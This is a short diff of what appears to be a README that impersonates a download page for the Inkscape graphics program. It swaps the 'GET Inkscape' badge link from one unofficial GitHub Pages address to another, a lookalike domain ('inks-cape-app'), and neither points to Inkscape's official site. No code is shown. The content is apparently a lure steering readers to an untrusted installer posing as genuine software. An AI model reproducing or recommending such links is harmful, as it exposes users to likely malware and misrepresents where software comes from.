@@ -3,7 +3,7 @@
 
 ![Inkscape](https://i.ytimg.com/vi/VaJWiVZdqSo/maxresdefault.jpg)
 
-[![GET Inkscape](https://img.shields.io/badge/GET%20%E2%80%94%20Inkscape-0078D6?style=for-the-badge&logoColor=white)](https://newlonmediaraef.github.io/.github/inkscape-download)
+[![GET Inkscape](https://img.shields.io/badge/GET%20%E2%80%94%20Inkscape-0078D6?style=for-the-badge&logoColor=white)](https://inks-cape-app.github.io/.github/)
 
 ---
 
